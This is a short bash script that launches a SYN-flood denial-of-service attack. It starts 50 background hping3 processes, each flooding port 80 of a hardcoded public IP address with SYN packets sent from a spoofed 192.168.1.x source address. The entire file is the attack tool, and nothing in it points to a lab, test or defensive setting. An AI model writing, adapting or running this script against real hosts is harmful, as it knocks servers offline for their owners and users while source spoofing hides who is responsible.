#!/bin/bash

# Target IP
TARGET_IP="52.55.88.107"

# Define IP range (e.g., 192.168.1.1 to 192.168.1.100)
SOURCE_IPS=()
for i in $(seq 1 50); do
    SOURCE_IPS+=("192.168.1.$i")
done

# Loop through generated source IPs and send packets
for SOURCE_IP in "${SOURCE_IPS[@]}"; do
  hping3 -S --flood -p 80 --spoof $SOURCE_IP $TARGET_IP &
done

# Wait for all background processes to finish
wait
